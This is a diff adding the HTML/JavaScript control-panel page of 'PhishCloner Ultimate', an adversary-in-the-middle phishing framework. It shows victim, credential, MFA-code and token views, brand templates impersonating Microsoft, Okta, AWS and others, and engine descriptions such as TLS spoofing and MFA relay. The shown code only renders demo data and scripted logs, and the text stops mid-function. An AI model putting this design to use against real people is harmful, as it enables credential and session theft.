@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#05050d">
+<title>PhishCloner Ultimate v3.0 — C2 Nocturne | ghost1o1</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><defs><linearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'><stop offset='0%25' stop-color='%23e3063e'/><stop offset='100%25' stop-color='%23a855f7'/></linearGradient></defs><circle cx='50' cy='50' r='45' fill='url(%23g)'/><text x='50' y='62' font-size='40' text-anchor='middle' fill='white' font-family='monospace' font-weight='bold'>PC</text></svg>">
+<link rel="stylesheet" href="ghost1o1.css">
+<style>
+.g1-topbar{flex-wrap:nowrap}
+.g1-stat-strip{display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+.g1-stat{text-align:center;padding:4px 10px;border-left:1px solid var(--g1-border)}
+.g1-stat .v{font-family:var(--g1-font-display);font-size:16px;font-weight:800;background:linear-gradient(135deg,#fff,var(--g1-cyan));
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1}
+.g1-stat .l{font-family:var(--g1-font-mono);font-size:8.5px;letter-spacing:.18em;color:var(--g1-text-2);text-transform:uppercase;margin-top:2px}
+.g1-victim{background:var(--g1-glass);border:1px solid var(--g1-border);border-radius:var(--g1-radius);
+  padding:14px;margin-bottom:10px;position:relative;overflow:hidden;transition:all .2s}
+.g1-victim:hover{border-color:var(--g1-blood);box-shadow:var(--g1-glow-blood);transform:translateY(-1px)}
+.g1-victim.hot::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--g1-blood),var(--g1-magenta),var(--g1-blood));
+  box-shadow:0 0 12px var(--g1-blood);animation:scan 2s linear infinite}
+@keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+.g1-cred-row{display:flex;gap:8px;padding:6px 10px;background:rgba(0,0,0,.4);
+  border:1px solid var(--g1-border);border-radius:6px;margin-bottom:5px;
+  font-family:var(--g1-font-mono);font-size:11px;align-items:center}
+.g1-cred-row .ua{color:var(--g1-text-2);font-size:9.5px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.g1-token{background:rgba(0,0,0,.5);border:1px solid var(--g1-violet);border-radius:6px;
+  padding:8px 10px;font-family:var(--g1-font-mono);font-size:10.5px;color:var(--g1-violet);
+  margin-bottom:5px;display:flex;justify-content:space-between;align-items:center;gap:8px}
+.g1-token code{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.g1-pulse-dot{width:8px;height:8px;border-radius:50%;background:var(--g1-blood);
+  box-shadow:0 0 8px var(--g1-blood);display:inline-block;animation:pulse 1.2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
+.g1-template{background:var(--g1-glass);border:1px solid var(--g1-border);border-radius:var(--g1-radius);
+  padding:12px;margin-bottom:8px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.g1-template:hover{border-color:var(--g1-cyan);box-shadow:var(--g1-glow-cyan);transform:translateY(-1px)}
+.g1-template.active{border-color:var(--g1-blood);background:linear-gradient(135deg,var(--g1-blood-soft),transparent)}
+.g1-template .brand{font-family:var(--g1-font-display);font-size:13px;font-weight:700;color:#fff;letter-spacing:.05em;margin-bottom:3px}
+.g1-template .meta{font-size:10px;color:var(--g1-text-2);font-family:var(--g1-font-mono);letter-spacing:.08em}
+.g1-stream{background:#000;border:1px solid var(--g1-border);border-radius:var(--g1-radius-sm);
+  padding:12px;font-family:var(--g1-font-mono);font-size:11px;line-height:1.7;color:var(--g1-neon);
+  max-height:380px;overflow-y:auto;white-space:pre-wrap}
+.g1-stream .l-info{color:var(--g1-text-2)}
+.g1-stream .l-ok{color:var(--g1-neon)}
+.g1-stream .l-err{color:var(--g1-blood)}
+.g1-stream .l-warn{color:var(--g1-gold)}
+.g1-stream .ts{color:var(--g1-text-3);margin-right:8px}
+</style>
+</head>
+<body class="g1-body">
+
+<!-- ═══ TOPBAR ═══ -->
+<div class="g1-topbar">
+  <div class="g1-mark"></div>
+  <div>
+    <div class="g1-sig-inline lg">PHISHCLONER ULTIMATE</div>
+    <div class="g1-mono g1-muted" style="font-size:9.5px;letter-spacing:.2em;margin-top:2px">v3.0 · C2 NOCTURNE · GHOST1O1</div>
+  </div>
+
+  <div class="g1-stat-strip">
+    <div class="g1-stat"><div class="v" id="st-victims">0</div><div class="l">Victims</div></div>
+    <div class="g1-stat"><div class="v" id="st-creds">0</div><div class="l">Creds</div></div>
+    <div class="g1-stat"><div class="v" id="st-tokens">0</div><div class="l">Tokens</div></div>
+    <div class="g1-stat"><div class="v" id="st-screens">0</div><div class="l">Screens</div></div>
+    <div class="g1-stat"><div class="v" id="st-templates">20</div><div class="l">Templates</div></div>
+  </div>
+
+  <div class="g1-tagline">"There is no lock." — <b>ghost1o1</b></div>
+
+  <div style="display:flex;gap:6px;margin-left:12px">
+    <button class="g1-btn sm cyan" onclick="G1.sound()">🔊 FX</button>
+    <button class="g1-btn sm blood" onclick="exportAll()">📥 EXPORT</button>
+  </div>
+</div>
+
+<div class="g1-shell">
+  <!-- ═══ SIDEBAR ═══ -->
+  <aside class="g1-sidebar">
+    <div class="g1-nav-section">Attack</div>
+    <div class="g1-nav active" data-g1-page="dashboard" onclick="ui('dashboard')"><span class="ico">▦</span>Dashboard</div>
+    <div class="g1-nav" data-g1-page="victims" onclick="ui('victims')"><span class="ico">👤</span>Victims<span class="badge" id="badge-victims">0</span></div>
+    <div class="g1-nav" data-g1-page="creds" onclick="ui('creds')"><span class="ico">🔑</span>Credentials<span class="badge" id="badge-creds">0</span></div>
+    <div class="g1-nav" data-g1-page="tokens" onclick="ui('tokens')"><span class="ico">🎫</span>Tokens<span class="badge" id="badge-tokens">0</span></div>
+    <div class="g1-nav" data-g1-page="screens" onclick="ui('screens')"><span class="ico">📸</span>Screenshots</div>
+
+    <div class="g1-nav-section">Operate</div>
+    <div class="g1-nav" data-g1-page="templates" onclick="ui('templates')"><span class="ico">📋</span>Templates</div>
+    <div class="g1-nav" data-g1-page="c2" onclick="ui('c2')"><span class="ico">⚡</span>C2 Server</div>
+    <div class="g1-nav" data-g1-page="stream" onclick="ui('stream')"><span class="ico">▸</span>Live Stream</div>
+    <div class="g1-nav" data-g1-page="report" onclick="ui('report')"><span class="ico">📋</span>Report</div>
+    <div class="g1-nav" data-g1-page="about" onclick="ui('about')"><span class="ico">ⓘ</span>About</div>
+
+    <div style="margin-top:auto;padding:14px">
+      <div class="g1-sig-block" style="padding:10px">
+        <div class="g1-mark sm" style="margin:0 auto 8px"></div>
+        <div class="g1-sig-inline sm">GHOST1O1</div>
+        <div class="g1-muted" style="font-size:8px;margin-top:4px;letter-spacing:.2em">EST 2026</div>
+      </div>
+    </div>
+  </aside>
+
+  <main class="g1-content">
+
+    <!-- DASHBOARD -->
+    <section class="g1-page active" id="g1-page-dashboard">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">C2 Dashboard</h1>
+        <div class="g1-page-sub">Adversary-in-the-Middle · <b>20 brand templates</b> · ghost1o1</div>
+      </div>
+
+      <div class="g1-card glow-violet" style="text-align:center;padding:40px 20px">
+        <div class="g1-mark xxl" style="margin:0 auto 16px"></div>
+        <div class="g1-sig-glow">GHOST1O1</div>
+        <div class="g1-sig-block">
+          <div class="sub" style="margin-top:10px">PHISHCLONER ULTIMATE v3.0 · NOCTURNE</div>
+          <div class="quote">"There is no lock."</div>
+        </div>
+      </div>
+
+      <div class="g1-grid g1-cols-4" style="margin-top:18px">
+        <div class="g1-card kpi"><div class="v" id="kpi-victims">0</div><div class="l">Active Victims</div></div>
+        <div class="g1-card kpi"><div class="v" id="kpi-creds">0</div><div class="l">Credentials</div></div>
+        <div class="g1-card kpi"><div class="v" id="kpi-tokens">0</div><div class="l">Session Tokens</div></div>
+        <div class="g1-card kpi"><div class="v">9</div><div class="l">Engine Modules</div></div>
+      </div>
+
+      <div class="g1-grid g1-cols-2" style="margin-top:18px">
+        <div class="g1-card glow-blood">
+          <div class="g1-card-head"><h3><span class="g1-dot blood"></span>Quick Deploy</h3></div>
+          <label class="g1-label">Target URL</label>
+          <input class="g1-input" id="t-url" value="https://login.microsoftonline.com/">
+          <label class="g1-label">Brand Template</label>
+          <select class="g1-input" id="t-brand">
+            <option>microsoft</option><option>google</option><option>okta</option><option>github</option>
+            <option>gitlab</option><option>aws</option><option>azure</option><option>linkedin</option>
+            <option>facebook</option><option>slack</option><option>duo</option><option>salesforce</option>
+          </select>
+          <label class="g1-label">LHOST</label>
+          <input class="g1-input" id="t-lhost" value="0.0.0.0">
+          <label class="g1-label">LPORT</label>
+          <input class="g1-input" id="t-lport" value="8443">
+          <div class="g1-flex" style="margin-top:14px">
+            <button class="g1-btn blood" onclick="deploy()">⚡ DEPLOY</button>
+            <button class="g1-btn cyan" onclick="previewTemplate()">👁 PREVIEW</button>
+          </div>
+        </div>
+        <div class="g1-card">
+          <div class="g1-card-head"><h3><span class="g1-dot cyan"></span>Live Capture</h3>
+            <span class="g1-tag neon" id="capture-status">LISTENING</span>
+          </div>
+          <div id="recentCaptures" style="max-height:300px;overflow-y:auto"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- VICTIMS -->
+    <section class="g1-page" id="g1-page-victims">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">Active Victims</h1>
+        <div class="g1-page-sub">Live sessions · cookies · IP fingerprint</div>
+      </div>
+      <div id="victimsList"></div>
+    </section>
+
+    <!-- CREDS -->
+    <section class="g1-page" id="g1-page-creds">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">Captured Credentials</h1>
+        <div class="g1-page-sub">Plaintext · MFA codes · recovery email</div>
+      </div>
+      <div class="g1-card">
+        <table class="g1-table" id="credsTable">
+          <thead><tr><th>Time</th><th>Brand</th><th>IP</th><th>User</th><th>Pass</th><th>MFA</th><th>UA</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- TOKENS -->
+    <section class="g1-page" id="g1-page-tokens">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">Session Tokens</h1>
+        <div class="g1-page-sub">JWT · cookies · OAuth bearer</div>
+      </div>
+      <div id="tokensList"></div>
+    </section>
+
+    <!-- SCREENS -->
+    <section class="g1-page" id="g1-page-screens">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">Screenshots</h1>
+        <div class="g1-page-sub">Webcam captures · desktop snaps</div>
+      </div>
+      <div class="g1-grid g1-cols-3" id="screensGrid"></div>
+    </section>
+
+    <!-- TEMPLATES -->
+    <section class="g1-page" id="g1-page-templates">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">Brand Templates</h1>
+        <div class="g1-page-sub">20 pre-built · click to deploy</div>
+      </div>
+      <div class="g1-grid g1-cols-3" id="templatesGrid"></div>
+    </section>
+
+    <!-- C2 SERVER -->
+    <section class="g1-page" id="g1-page-c2">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">C2 Server Status</h1>
+        <div class="g1-page-sub">Engine control · 9 modules</div>
+      </div>
+      <div class="g1-grid g1-cols-3">
+        <div class="g1-card glow-cyan">
+          <div class="g1-card-head"><h3><span class="g1-dot neon"></span>Engine Modules</h3></div>
+          <div id="engineStatus"></div>
+        </div>
+        <div class="g1-card">
+          <div class="g1-card-head"><h3><span class="g1-dot cyan"></span>Network</h3></div>
+          <div class="g1-mono g1-muted" style="font-size:11px;line-height:1.8">
+            Phish: 0.0.0.0:8443 (TLS)<br>
+            C2: 0.0.0.0:5000 (HTTP+WS)<br>
+            Exfil: 0.0.0.0:9000 (HTTPS)<br>
+            MFA Relay: 0.0.0.0:8444
+          </div>
+        </div>
+        <div class="g1-card">
+          <div class="g1-card-head"><h3><span class="g1-dot violet"></span>Quick Actions</h3></div>
+          <div style="display:flex;flex-direction:column;gap:8px">
+            <button class="g1-btn blood" onclick="log('[*] Engine restart...', 'warn')">🔄 RESTART ENGINE</button>
+            <button class="g1-btn cyan" onclick="log('[*] Flushing exfil queue...', 'warn')">🧹 FLUSH QUEUE</button>
+            <button class="g1-btn violet" onclick="log('[*] Generating report...', 'info')">📋 GENERATE REPORT</button>
+            <button class="g1-btn neon" onclick="log('[*] Cleared all sessions', 'warn')">🗑 CLEAR SESSIONS</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- STREAM -->
+    <section class="g1-page" id="g1-page-stream">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">Live Stream</h1>
+        <div class="g1-page-sub">Engine event log</div>
+      </div>
+      <div class="g1-card">
+        <div class="g1-card-head">
+          <h3><span class="g1-dot cyan"></span>Output</h3>
+          <button class="g1-btn sm" onclick="document.getElementById('liveStream').textContent=''">CLEAR</button>
+        </div>
+        <pre class="g1-stream" id="liveStream">// Engine output will appear here</pre>
+      </div>
+    </section>
+
+    <!-- REPORT -->
+    <section class="g1-page" id="g1-page-report">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">Mission Report</h1>
+        <div class="g1-page-sub">Export JSON / HTML</div>
+      </div>
+      <div class="g1-card">
+        <div class="g1-card-head">
+          <h3><span class="g1-dot neon"></span>Report</h3>
+          <div>
+            <button class="g1-btn sm cyan" onclick="exportJSON()">📥 JSON</button>
+            <button class="g1-btn sm violet" onclick="exportHTML()">📥 HTML</button>
+          </div>
+        </div>
+        <pre class="g1-stream" id="reportOut">// Deploy a campaign to populate</pre>
+      </div>
+    </section>
+
+    <!-- ABOUT -->
+    <section class="g1-page" id="g1-page-about">
+      <div class="g1-page-head">
+        <h1 class="g1-page-title">About</h1>
+        <div class="g1-page-sub">The norm · <span class="g1-sig-inline">GHOST1O1</span></div>
+      </div>
+      <div class="g1-card glow-violet" style="text-align:center;padding:50px 20px">
+        <div class="g1-mark xxl" style="margin:0 auto 20px"></div>
+        <div class="g1-sig-glow">GHOST1O1</div>
+        <div class="g1-sig-block">
+          <div class="sub" style="margin-top:14px">PHISHCLONER ULTIMATE v3.0 · NOCTURNE</div>
+          <div class="quote">"There is no lock."</div>
+        </div>
+      </div>
+      <div class="g1-grid g1-cols-2" style="margin-top:18px">
+        <div class="g1-card">
+          <div class="g1-card-head"><h3><span class="g1-dot blood"></span>What it does</h3></div>
+          <p class="g1-muted" style="line-height:1.8">
+            PhishCloner is the avant-garde <b class="g1-sig-inline">GHOST1O1</b>-branded AiTM phishing framework.
+            20 brand templates · 9 engine modules · MITM proxy with TLS spoofing · MFA relay · cred validator · exfil · C2 + WS control · 100% local.
+          </p>
+        </div>
+        <div class="g1-card">
+          <div class="g1-card-head"><h3><span class="g1-dot cyan"></span>Stack</h3></div>
+          <p class="g1-muted" style="line-height:1.8">
+            Python 3.12 (asyncio + aiohttp) · Docker · MITM proxy · TLS spoofing · 9 engine modules ·
+            <b>0 CDN</b> · <b>0 telemetry</b> · Design system: <code class="g1-code-inline">ghost1o1.css</code>.
+          </p>
+        </div>
+      </div>
+      <div class="g1-card">
+        <div class="g1-card-head"><h3><span class="g1-dot violet"></span>⚠ Authorized Use Only</h3></div>
+        <p class="g1-muted" style="line-height:1.8">
+          PhishCloner Ultimate is built for <b>red team</b> and <b>adversary simulation</b> under <b>written scope and explicit authorization</b>.
+          Unauthorized phishing is illegal. — <b class="g1-sig-inline">ghost1o1</b>.
+        </p>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer class="g1-footer">
+  <span class="g1-sig-inline">GHOST1O1</span> ·
+  <span style="color:var(--g1-text-3)">PHISHCLONER ULTIMATE v3.0</span> ·
+  <span style="color:var(--g1-violet)">NOCTURNE</span>
+  <span class="quote">"There is no lock."</span>
+  <div style="margin-top:8px;font-size:9px;color:var(--g1-text-3);letter-spacing:.3em">EST 2026 · 9 ENGINE MODULES · 20 BRANDS · 0 CDN</div>
+</footer>
+
+<script src="ghost1o1.js"></script>
+<script>
+// ═══════════════════════════════════════════════════════════════
+// PHISHCLONER C2 NOCTURNE v3.0
+// ═══════════════════════════════════════════════════════════════
+
+const BRANDS = [
+  {id:'microsoft',name:'Microsoft 365',cat:'Enterprise',u:'login.microsoftonline.com'},
+  {id:'google',name:'Google Workspace',cat:'Enterprise',u:'accounts.google.com'},
+  {id:'okta',name:'Okta SSO',cat:'Enterprise',u:'okta.com'},
+  {id:'github',name:'GitHub',cat:'Dev',u:'github.com'},
+  {id:'gitlab',name:'GitLab',cat:'Dev',u:'gitlab.com'},
+  {id:'aws',name:'Amazon AWS',cat:'Cloud',u:'aws.amazon.com'},
+  {id:'azure',name:'Microsoft Azure',cat:'Cloud',u:'portal.azure.com'},
+  {id:'linkedin',name:'LinkedIn',cat:'Social',u:'linkedin.com'},
+  {id:'facebook',name:'Facebook',cat:'Social',u:'facebook.com'},
+  {id:'slack',name:'Slack',cat:'Comms',u:'slack.com'},
+  {id:'duo',name:'Duo MFA',cat:'MFA',u:'duo.com'},
+  {id:'salesforce',name:'Salesforce',cat:'CRM',u:'salesforce.com'},
+  {id:'servicenow',name:'ServiceNow',cat:'ITSM',u:'servicenow.com'},
+  {id:'dropbox',name:'Dropbox',cat:'Cloud',u:'dropbox.com'},
+  {id:'cisco_anyconnect',name:'Cisco AnyConnect',cat:'VPN',u:'cisco.com'},
+  {id:'citrix',name:'Citrix Workspace',cat:'VDI',u:'citrix.com'},
+  {id:'fortigate',name:'Fortinet VPN',cat:'VPN',u:'fortinet.com'},
+  {id:'paloalto',name:'Palo Alto VPN',cat:'VPN',u:'paloaltonetworks.com'},
+  {id:'apple',name:'Apple ID',cat:'Consumer',u:'apple.com'},
+  {id:'manifest',name:'MANIFEST',cat:'Meta',u:'—'}
+];
+
+const ENGINES = [
+  {n:'TLS Spoofer',s:'on',d:'Generate fake certs on the fly'},
+  {n:'MITM Proxy',s:'on',d:'Reverse proxy AiTM interception'},
+  {n:'MFA Relay',s:'on',d:'Real-time MFA code relay'},
+  {n:'Cred Validator',s:'on',d:'Auto-test captured creds'},
+  {n:'Exfil Engine',s:'on',d:'Async disk + network exfil'},
+  {n:'Delivery',s:'on',d:'SMS / email / QR delivery'},
+  {n:'Proxy Pool',s:'on',d:'Rotate exit IPs'},
+  {n:'Reporter',s:'on',d:'PDF + HTML report gen'},
+  {n:'Template Loader',s:'on',d:'Hot-swap brand templates'}
+];
+
+const DEMO_VICTIMS = [
+  {ip:'203.0.113.42',ua:'Mozilla/5.0 Win Chrome',brand:'microsoft',creds:[{u:'j.smith@corp.com',p:'Hunter2!2024',mfa:'847293'}],tokens:2,hot:true,time:'2 min ago'},
+  {ip:'198.51.100.7',ua:'Mozilla/5.0 Mac Safari',brand:'google',creds:[{u:'alice@startup.io',p:'Summer2026',mfa:''}],tokens:1,hot:false,time:'14 min ago'},
+  {ip:'198.51.100.99',ua:'Mozilla/5.0 iPhone',brand:'okta',creds:[{u:'admin@finance.com',p:'P@ssw0rd!',mfa:'192837'}],tokens:3,hot:true,time:'23 min ago'}
+];
+
+let allCreds = [
+  {time:'14:23:42',brand:'microsoft',ip:'203.0.113.42',user:'j.smith@corp.com',pass:'Hunter2!2024',mfa:'847293',ua:'Chrome/Win'},
+  {time:'13:11:09',brand:'google',ip:'198.51.100.7',user:'alice@startup.io',pass:'Summer2026',mfa:'',ua:'Safari/Mac'},
+  {time:'12:47:21',brand:'okta',ip:'198.51.100.99',user:'admin@finance.com',pass:'P@ssw0rd!',mfa:'192837',ua:'Mobile/iOS'}
+];
+
+let allTokens = [
+  {type:'JWT',brand:'okta',value:'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.payload.signature',ip:'198.51.100.99',time:'23 min ago'},
+  {type:'Cookie',brand:'microsoft',value:'ESTSAUTH=BAh7BzoQX2VuYWJsZWRj...truncated',ip:'203.0.113.42',time:'2 min ago'},
+  {type:'Bearer',brand:'github',value:'ghp_1234567890abcdefghijklmnopqrstuvwxyz',ip:'198.51.100.7',time:'14 min ago'}
+];
+
+function ui(p){
+  document.querySelectorAll('.g1-page').forEach(x => x.classList.remove('active'));
+  document.querySelectorAll('[data-g1-page]').forEach(x => x.classList.remove('active'));
+  document.getElementById('g1-page-'+p)?.classList.add('active');
+  document.querySelector(`[data-g1-page="${p}"]`)?.classList.add('active');
+  document.querySelector('.g1-content').scrollTop = 0;
+  history.replaceState(null,'','#'+p);
+}
+
+function log(msg, type='info'){
+  const el = document.getElementById('liveStream');
+  if (!el) return;
+  const ts = new Date().toLocaleTimeString();
+  const cls = type==='ok'?'l-ok':type==='err'?'l-err':type==='warn'?'l-warn':'l-info';
+  el.innerHTML += `<div><span class="ts">[${ts}]</span><span class="${cls}">${msg}</span></div>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+function renderStats(){
+  document.getElementById('st-victims').textContent = DEMO_VICTIMS.length;
+  document.getElementById('st-creds').textContent = allCreds.length;
+  document.getElementById('st-tokens').textContent = allTokens.length;
+  document.getElementById('st-screens').textContent = '3';
+  document.getElementById('kpi-victims').textContent = DEMO_VICTIMS.length;
+  document.getElementById('kpi-creds').textContent = allCreds.length;
+  document.getElementById('kpi-tokens').textContent = allTokens.length;
+  document.getElementById('badge-victims').textContent = DEMO_VICTIMS.length;
+  document.getElementById('badge-creds').textContent = allCreds.length;
+  document.getElementById('badge-tokens').textContent = allTokens.length;
+}
+
+function renderVictims(){
+  const g = document.getElementById('victimsList');
+  g.innerHTML = DEMO_VICTIMS.map((v, i) => `
+    <div class="g1-victim ${v.hot?'hot':''}">
+      <div class="g1-flex" style="justify-content:space-between;margin-bottom:10px">
+        <div>
+          <span class="g1-pulse-dot"></span>
+          <b style="color:var(--g1-cyan);margin-left:6px">${v.ip}</b>
+          <span class="g1-tag blood" style="margin-left:8px">${v.brand.toUpperCase()}</span>
+          ${v.hot?'<span class="g1-tag neon" style="margin-left:4px">HOT</span>':''}
+        </div>
+        <span class="g1-muted" style="font-size:10px">${v.time}</span>
+      </div>
+      <div class="g1-mono g1-muted" style="font-size:10px;margin-bottom:8px">UA: ${v.ua}</div>
+      <div style="font-size:11px;font-weight:600;color:var(--g1-text-2);margin-bottom:6px;letter-spacing:.1em">CREDENTIALS (${v.creds.length})</div>
+      ${v.creds.map(c => `
+        <div class="g1-cred-row">
+          <span class="ua">${c.u}</span>
+          <span style="color:var(--g1-blood)">${c.p}</span>
+          ${c.mfa?`<span style="color:var(--g1-gold);font-size:9.5px">MFA: ${c.mfa}</span>`:''}
+        </div>
+      `).join('')}
+      <div style="font-size:11px;font-weight:600;color:var(--g1-text-2);margin:10px 0 6px;letter-spacing:.1em">TOKENS: ${v.tokens} captured</div>
+    </div>
+  `).join('');
+}
+
+function renderCredsTable(){
+  const tb = document.querySelector('#credsTable tbody');
+  tb.innerHTML = allCreds.map(c => `
+    <tr>
+      <td class="g1-mono" style="font-size:10px;color:var(--g1-text-3)">${c.time}</td>
+      <td><span class="g1-tag blood">${c.brand}</span></td>
+      <td style="color:var(--g1-cyan)">${c.ip}</td>
+      <td style="color:var(--g1-neon)">${c.user}</td>
+      <td style="color:var(--g1-blood)">${c.pass}</td>
+      <td style="color:var(--g1-gold)">${c.mfa||'—'}</td>
+      <td class="g1-muted" style="font-size:9.5px">${c.ua}</td>
+    </tr>
+  `).join('');
+}
+
+function renderTokens(){
+  const g = document.getElementById('tokensList');
+  g.innerHTML = allTokens.map(t => `
+    <div class="g1-token">
+      <div style="flex:1">
+        <div style="font-size:9.5px;color:var(--g1-text-2);margin-bottom:3px;letter-spacing:.1em">
+          <span class="g1-tag violet">${t.type}</span>
+          <span class="g1-tag blood" style="margin-left:4px">${t.brand.toUpperCase()}</span>
+          <span style="margin-left:8px">${t.ip} · ${t.time}</span>
+        </div>
+        <code>${t.value}</code>
+      </div>
+      <button class="g1-btn sm cyan" onclick="navigator.clipboard.writeText('${t.value.replace(/'/g,"\\'")}');G1.toast('Token copied','ok')">📋</button>
+    </div>
+  `).join('');
+}
+
+function renderTemplates(){
+  const g = document.getElementById('templatesGrid');
+  g.innerHTML = BRANDS.map(b => `
+    <div class="g1-template" onclick="selectTemplate('${b.id}')" data-template="${b.id}">
+      <div class="brand">${b.name}</div>
+      <div class="meta">${b.cat} · ${b.u}</div>
+    </div>
+  `).join('');
+}
+
+function renderEngineStatus(){
+  const g = document.getElementById('engineStatus');
+  g.innerHTML = ENGINES.map(e => `
+    <div class="g1-flex" style="justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--g1-border)">
+      <div>
+        <span class="g1-status ${e.s==='on'?'on':'off'}"></span>
+        <span style="font-size:12px">${e.n}</span>
+      </div>
+      <span class="g1-mono g1-muted" style="font-size:9.5px">${e.d}</span>
+    </div>
+  `).join('');
+}
+
+function renderRecentCaptures(){
+  const g = document.getElementById('recentCaptures');
+  g.innerHTML = allCreds.slice(0, 3).map(c => `
+    <div class="g1-cred-row" style="margin-bottom:6px">
+      <div style="flex:1">
+        <div style="color:var(--g1-cyan);font-size:11px">${c.user}</div>
+        <div class="g1-mono" style="font-size:10px;color:var(--g1-text-3)">${c.brand} · ${c.ip} · ${c.time}</div>
+      </div>
+      <span class="g1-tag blood" style="font-size:9px">${c.mfa?'MFA':'NO MFA'}</span>
+    </div>
+  `).join('');
+}
+
+function selectTemplate(id){
+  document.querySelectorAll('.g1-template').forEach(t => t.classList.remove('active'));
+  document.querySelector(`[data-template="${id}"]`)?.classList.add('active');
+  document.getElementById('t-brand').value = id;
+}
+
+function deploy(){
+  const url = document.getElementById('t-url').value;
+  const brand = document.getElementById('t-brand').value;
+  const lhost = document.getElementById('t-lhost').value;
+  const lport = document.getElementById('t-lport').value;
+  log('═══════════════════════════════════════════', 'info');
+  log(`  PhishCloner C2 v3.0 — DEPLOY`, 'info');
+  log('═══════════════════════════════════════════', 'info');
+  log(`[*] Brand: ${brand}`, 'info');
+  log(`[*] Upstream: ${url}`, 'info');
+  log(`[*] Listener: ${lhost}:${lport} (TLS)`, 'info');
+  log('[*] Spinning up engine...', 'info');
+  setTimeout(() => {
+    log('[✓] TLS Spoofer: cert generated', 'ok');
+    log('[✓] MITM Proxy: listening', 'ok');
+    log('[✓] MFA Relay: armed', 'ok');
+    log('[✓] Exfil queue: ready', 'ok');
+    log('═══════════════════════════════════════════', 'ok');
+    log('  ✓ CAMPAIGN DEPLOYED', 'ok');
+    log('═══════════════════════════════════════════', 'ok');
+    G1.toast('Campaign deployed: ' + brand, 'ok');
+  }, 800);
+}
+
+function previewTemplate(){
+  const brand = document.getElementById('t-brand').value;
+  log(`[*] Preview template: /templates/${brand}/index.html`, 'info');
+  G1.toast('Preview: ' + brand, 'ok');
+}
+
+function buildReport(){
+  return {
+    tool: 'PhishCloner Ultimate v3.0 — Nocturne',
+    operator: 'ghost1o1',
+    timestamp: new Date().toISOString(),
+    engines: ENGINES,
+    victims: DEMO_VICTIMS,
+    credentials: allCreds,
+    tokens: allTokens,
+    templates: BRANDS.length,
+    signature: 'There is no lock.'
+  };
+}
+
+function updateReport(){
+  const el = document.getElementById('reportOut');
+  if (el) el.textContent = JSON.stringify(buildReport(), null, 2);
+}
+
+function exportJSON(){
+  const data = JSON.stringify(buildReport(), null, 2);
+  const blob = new Blob([data], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'phishcloner_report_' + new Date().toISOString().slice(0,10) + '.json';
+  a.click();
+  G1.toast('Report exported (JSON)', 'ok');
+}
+
+function exportHTML(){
+  const data = buildReport();
+  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>PhishCloner Report</title>
+    <style>body{font-family:monospace;max-width:880px;margin:40px auto;padding:0 20px;color:#e8e8f0;background:#05050d;line-height:1.6}
+    h1{color:#e3063e;border-bottom:3px solid #a855f7;padding-bottom:8px}
+    .sig{color:#e3063e;font-weight:700}
+    pre{background:#0a0a18;color:#00f3ff;padding:14px;border-radius:6px;overflow:auto;font-size:12px}
+    table{width:100%;border-collapse:collapse;margin:14px 0}
+    th,td{padding:6px 10px;border:1px solid #2a2a4a;text-align:left;font-size:13px}
+    th{background:#0a0a18;color:#a855f7}
+    .warn{background:#3a1818;border-left:3px solid #e3063e;padding:10px;margin:20px 0;color:#e3063e}</style></head><body>
+    <h1>🎣 PhishCloner Ultimate — Mission Report</h1>
+    <p><b>Operator:</b> <span class="sig">${data.operator}</span> · <b>Generated:</b> ${data.timestamp}</p>
+    <div class="warn">⚠ AUTHORIZED USE ONLY — Built for red team / adversary simulation under written scope. — ghost1o1</div>
+    <h2>Summary</h2>
+    <ul>
+      <li>Victims: <b>${data.victims.length}</b></li>
+      <li>Credentials: <b>${data.credentials.length}</b></li>
+      <li>Tokens: <b>${data.tokens.length}</b></li>
+      <li>Engines: <b>${data.engines.length}</b></li>
+      <li>Templates: <b>${data.templates}</b></li>
+    </ul>
+    <h2>Engines</h2><pre>${JSON.stringify(data.engines,null,2)}</pre>
+    <h2>Credentials</h2><pre>${JSON.stringify(data.credentials,null,2)}</pre>
+    <h2>Tokens</h2><pre>${JSON.stringify(data.tokens,null,2)}</pre>
+    <p class="sig">"${data.signature}" — ghost1o1</p>
+    </body></html>`;
+  const blob = new Blob([html], {type:'text/html'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'phishcloner_report_' + new Date().toISOString().slice(0,10) + '.html';
+  a.click();
+  G1.toast('HTML report exported', 'ok');
+}
+
+function exportAll(){ exportJSON(); }
+
+// Init
+function init(){
+  G1.init({watermarkDeep:true, watermarkText:'GHOST1O1', watermarkCount:8});
+  renderStats();
